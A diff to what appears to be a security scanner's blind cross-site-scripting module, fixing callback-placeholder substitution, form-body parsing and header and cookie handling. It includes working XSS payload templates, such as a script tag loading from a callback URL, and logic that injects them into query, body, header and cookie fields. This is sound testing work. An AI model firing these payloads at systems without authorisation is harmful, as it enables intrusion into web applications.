@@ -45,6 +45,31 @@ fn location_of(param_type: &str) -> &'static str {
     }
 }
 
+/// Whether `data` looks like an `application/x-www-form-urlencoded` body, so
+/// the blind path may enumerate `&`/`=` fields from it and re-serialize them.
+/// A JSON (`{`/`[`), GraphQL (`{`) or XML (`<`) body is not — splitting one on
+/// `&`/`=` invents a garbage field name and re-serializes into a corrupt
+/// request — so it is skipped. Requires an `=` so an opaque token body yields
+/// no fields either.
+fn looks_like_urlencoded_form(data: &str) -> bool {
+    let trimmed = data.trim_start();
+    !matches!(trimmed.as_bytes().first(), Some(b'{' | b'[' | b'<')) && trimmed.contains('=')
+}
+
+/// Placeholder the blind templates carry for the callback URL.
+///
+/// Custom templates are written with `{callback}` and keep it verbatim. They
+/// used to be normalized to the built-in catalog's bare `{}`, and every `{}`
+/// was then substituted — so a template with JavaScript in it
+/// (`fetch('{callback}').catch(()=>{})`) had its empty function body replaced
+/// by the callback URL too, the payload became a syntax error, and the blind
+/// probe could never call home. The built-in `{}` is converted to this marker
+/// instead, so a literal `{}` in a template is never touched.
+const CALLBACK_MARKER: &str = "{callback}";
+
+/// Last-resort template when the built-in catalog is somehow empty.
+const FALLBACK_TEMPLATE: &str = "\"'><script src={callback}></script>";
+
 /// Build the concrete payload(s) to send for one (param × template) slot and,
 /// for any OOB source, mint+record a fresh callback URL keyed by its nonce so a
 /// later interaction correlates back to this exact request.
@@ -61,11 +86,11 @@ fn build_send_payloads(
 ) -> Vec<String> {
     let mut out = Vec::with_capacity(2);
     if let Some(url) = source.static_url() {
-        out.push(template.replace("{}", url));
+        out.push(template.replace(CALLBACK_MARKER, url));
     }
     if let Some(session) = source.session() {
         let (url, nonce) = session.mint_url();
-        let payload = template.replace("{}", &url);
+        let payload = template.replace(CALLBACK_MARKER, &url);
         session.registry().record(
             nonce,
             InjectionRecord {
@@ -82,7 +107,7 @@ fn build_send_payloads(
 }
 
 /// Build the blind-XSS payload *templates* (callback placeholder still present,
-/// normalized to a single `{}` marker).
+/// as [`CALLBACK_MARKER`]).
 ///
 /// When `custom_template_path` is provided, every non-empty, non-`#`-comment
 /// line that contains `{callback}` is treated as a template. Lines without
@@ -104,8 +129,8 @@ fn build_blind_templates(custom_template_path: Option<&str>) -> Vec<String> {
                     if trimmed.is_empty() || trimmed.starts_with('#') {
                         continue;
                     }
-                    if trimmed.contains("{callback}") {
-                        templates.push(trimmed.replace("{callback}", "{}"));
+                    if trimmed.contains(CALLBACK_MARKER) {
+                        templates.push(trimmed.to_string());
                     } else {
                         bad_lines += 1;
                         if bad_lines <= 3 {
@@ -140,10 +165,10 @@ fn build_blind_templates(custom_template_path: Option<&str>) -> Vec<String> {
     // extra requests per param are a worthwhile trade for the added coverage.
     let templates: Vec<String> = crate::payload::XSS_BLIND_PAYLOADS
         .iter()
-        .map(|t| t.to_string())
+        .map(|t| t.replace("{}", CALLBACK_MARKER))
         .collect();
     if templates.is_empty() {
-        return vec!["\"'><script src={}></script>".to_string()];
+        return vec![FALLBACK_TEMPLATE.to_string()];
     }
     templates
 }
@@ -183,11 +208,24 @@ pub async fn blind_scanning_with(
         all_params.push((k.into_owned(), "query"));
     }
 
-    // Body params
-    if let Some(data) = &target.data {
+    // Body params. The blind body path only rewrites urlencoded forms
+    // (`send_blind_request` re-serializes with `urlencoded_body`), so a JSON /
+    // XML / GraphQL body is skipped whole rather than split on `&`/`=` — a
+    // body like `{"next":"/a?x=1"}` is one `=`-bearing segment that would
+    // otherwise be parsed into a garbage field name and re-serialized into a
+    // corrupt request. Names are form-decoded, because the body injector
+    // matches them against `form_urlencoded::parse` output: a raw
+    // `user%5Bname%5D` or `first+name` never matched its decoded self, so the
+    // real field was left untouched and a new, double-encoded field appended.
+    if let Some(data) = &target.data
+        && looks_like_urlencoded_form(data)
+    {
         for pair in data.split('&') {
-            if let Some((k, _v)) = pair.split_once('=') {
-                all_params.push((k.to_string(), "body"));
+            if !pair.contains('=') {
+                continue;
+            }
+            if let Some((k, _v)) = url::form_urlencoded::parse(pair.as_bytes()).next() {
+                all_params.push((k.into_owned(), "body"));
             }
         }
     }
@@ -222,8 +260,19 @@ async fn send_blind_request(target: &Target, param_name: &str, payload: &str, pa
     use url::form_urlencoded;
 
     let client = target.build_client_or_default();
+    let method = target.parse_method();
 
-    let url = match param_type {
+    // Headers, the User-Agent override and cookies go through the builders the
+    // scan's own injectors use (`build_request`, `apply_header_overrides`, the
+    // cookie branch of `url_inject::build_header_request`). This path used to
+    // hand-roll them with reqwest's appending `.header()`: `--user-agent X`
+    // lands in both `target.headers` and `target.user_agent`, so every blind
+    // request carried two `User-Agent` headers, and the User-Agent injection —
+    // the classic blind vector, since UAs end up in admin log viewers — went
+    // out as `User-Agent: <payload>` *followed by* `User-Agent: X`. A
+    // `-H "Cookie: …"` likewise travelled next to a second Cookie header
+    // composed from `--cookies`.
+    let request = match param_type {
         "query" => {
             let mut pairs: Vec<(String, String)> = target
                 .url
@@ -246,94 +295,56 @@ async fn send_blind_request(target: &Target, param_name: &str, payload: &str, pa
                 .finish();
             let mut url = target.url.clone();
             url.set_query(Some(&query));
-            url
-        }
-        "body" => target.url.clone(),
-        "header" => target.url.clone(),
-        "cookie" => target.url.clone(),
-        _ => target.url.clone(),
-    };
-
-    let mut request = client.request(target.parse_method(), url.clone());
-
-    let mut headers = target.headers.clone();
-    let mut cookies = target.cookies.clone();
-    let mut body = target.data.clone();
-
-    match param_type {
-        "query" => {
-            // Already handled in url
+            crate::utils::build_request(&client, target, method, url, target.data.clone())
         }
         "body" => {
-            if let Some(data) = &target.data {
-                // Parse the form body and replace only the exact-name match's
-                // value, then re-serialize (mirrors the query branch above). The
-                // old `str::replace("{name}=", "{name}={payload}&")` never
-                // removed the original value (`a=1&b=2` -> `a=PAY&1&b=2`,
-                // orphaning `&1`) and matched substring-colliding names (`id`
-                // also rewrote `userid`), corrupting the body and injecting into
-                // the wrong parameter — a silent blind-XSS delivery failure.
-                let mut pairs: Vec<(String, String)> = form_urlencoded::parse(data.as_bytes())
-                    .map(|(k, v)| (k.to_string(), v.to_string()))
-                    .collect();
-                let mut found = false;
-                for pair in &mut pairs {
-                    if pair.0 == param_name {
-                        pair.1 = payload.to_string();
-                        found = true;
-                        break;
-                    }
-                }
-                if !found {
-                    pairs.push((param_name.to_string(), payload.to_string()));
-                }
-                body = Some(
-                    form_urlencoded::Serializer::new(String::new())
-                        .extend_pairs(&pairs)
-                        .finish(),
-                );
-            }
+            // Replace only the exact-name match's value and re-serialize. The
+            // old `str::replace("{name}=", "{name}={payload}&")` never removed
+            // the original value (`a=1&b=2` -> `a=PAY&1&b=2`) and matched
+            // substring-colliding names (`id` also rewrote `userid`).
+            let body = target.data.as_deref().map(|data| {
+                crate::scanning::url_inject::urlencoded_body(Some(data), param_name, payload)
+            });
+            crate::utils::build_request(&client, target, method, target.url.clone(), body)
         }
         "header" => {
-            for (k, v) in &mut headers {
-                if k == param_name {
-                    *v = payload.to_string();
-                }
-            }
+            let base = crate::utils::build_request(
+                &client,
+                target,
+                method,
+                target.url.clone(),
+                target.data.clone(),
+            );
+            crate::utils::apply_header_overrides(
+                base,
+                &[(param_name.to_string(), payload.to_string())],
+            )
         }
         "cookie" => {
-            for (k, v) in &mut cookies {
-                if k == param_name {
-                    *v = payload.to_string();
-                }
-            }
+            // Injected cookie first, the target's other cookies after it.
+            let others =
+                crate::utils::compose_cookie_header_excluding(&target.cookies, Some(param_name));
+            let cookie_header = match others {
+                Some(rest) => format!("{}={}; {}", param_name, payload, rest),
+                None => format!("{}={}", param_name, payload),
+            };
+            crate::utils::build_request_with_cookie(
+                &client,
+                target,
+                method,
+                target.url.clone(),
+                target.data.clone(),
+                Some(cookie_header),
+            )
         }
-        _ => {}
-    }
-
-    for (k, v) in &headers {
-        request = request.header(k, v);
-    }
-    // Through `effective_user_agent` so the `Some("")` "no override" sentinel
-    // never reaches the wire as a literal `User-Agent:`.
-    if let Some(ua) = target.effective_user_agent() {
-        request = request.header("User-Agent", ua);
-    }
-    let mut cookie_header = String::new();
-    for (i, (k, v)) in cookies.iter().enumerate() {
-        if i > 0 {
-            cookie_header.push_str("; ");
-        }
-        cookie_header.push_str(k);
-        cookie_header.push('=');
-        cookie_header.push_str(v);
-    }
-    if !cookie_header.is_empty() {
-        request = request.header("Cookie", cookie_header);
-    }
-    if let Some(b) = &body {
-        request = request.body(b.clone());
-    }
+        _ => crate::utils::build_request(
+            &client,
+            target,
+            method,
+            target.url.clone(),
+            target.data.clone(),
+        ),
+    };
 
     // Send the request. We don't inspect the response (blind payloads report
     // out-of-band), but surface transport errors at DEBUG so users can tell a
@@ -396,24 +407,23 @@ pub async fn blind_scan_forms_with(
     let template = templates
         .first()
         .map(String::as_str)
-        .unwrap_or("\"'><script src={}></script>");
+        .unwrap_or(FALLBACK_TEMPLATE);
 
     let client = target.build_client_or_default();
-    let cookie_header = build_cookie_header(&target.cookies);
 
     // Always GET the form-bearing page. Reusing target.method would POST to
     // the form handler instead of fetching the landing page that renders the
     // form, mirroring parameter_analysis::discovery::form::check_form_discovery.
-    let mut fetch = client.get(target.url.clone());
-    for (k, v) in &target.headers {
-        fetch = fetch.header(k, v);
-    }
-    if let Some(ua) = target.effective_user_agent() {
-        fetch = fetch.header("User-Agent", ua);
-    }
-    if let Some(ref h) = cookie_header {
-        fetch = fetch.header("Cookie", h);
-    }
+    // Through the shared builder, which also drops a caller `Accept-Encoding`:
+    // setting it by hand turns off reqwest's decompression, the page comes back
+    // as compressed bytes, and no form is ever found.
+    let fetch = crate::utils::build_request(
+        &client,
+        target,
+        reqwest::Method::GET,
+        target.url.clone(),
+        None,
+    );
     crate::record_outbound_request().await;
     let html = match fetch.send().await {
         Ok(resp) => match crate::utils::http::read_body(resp).await {
@@ -509,24 +519,22 @@ pub async fn blind_scan_forms_with(
                     .collect::<Vec<_>>()
                     .join("&");
 
-                let mut request = client.post(action.clone());
-                for (k, v) in &target.headers {
-                    // Skip Content-Type from caller-supplied headers so we don't
-                    // emit a second value that conflicts with the urlencoded body.
-                    if k.eq_ignore_ascii_case("content-type") {
-                        continue;
-                    }
-                    request = request.header(k, v);
-                }
-                // Set Content-Type last to guarantee it wins.
-                request = request.header("Content-Type", "application/x-www-form-urlencoded");
-                if let Some(ua) = target.effective_user_agent() {
-                    request = request.header("User-Agent", ua);
-                }
-                if let Some(ref h) = cookie_header {
-                    request = request.header("Cookie", h);
-                }
-                request = request.body(body);
+                // The body-injector base drops a caller-supplied Content-Type so
+                // the urlencoded one below is the only value on the wire.
+                let request = crate::utils::build_body_request_base(
+                    &client,
+                    target,
+                    reqwest::Method::POST,
+                    action.clone(),
+                    Some(body),
+                );
+                let request = crate::utils::apply_header_overrides(
+                    request,
+                    &[(
+                        "Content-Type".to_string(),
+                        "application/x-www-form-urlencoded".to_string(),
+                    )],
+                );
 
                 crate::record_outbound_request().await;
                 if let Err(e) = request.send().await {
@@ -544,21 +552,6 @@ pub async fn blind_scan_forms_with(
             }
         }
     }
-}
-
-/// Build a `Cookie:` header value once, returning None if the target has no
-/// cookies configured.
-fn build_cookie_header(cookies: &[(String, String)]) -> Option<String> {
-    if cookies.is_empty() {
-        return None;
-    }
-    Some(
-        cookies
-            .iter()
-            .map(|(k, v)| format!("{}={}", k, v))
-            .collect::<Vec<_>>()
-            .join("; "),
-    )
 }
 
 /// Returns true when an `input`/`textarea`/`select` node accepts free-form
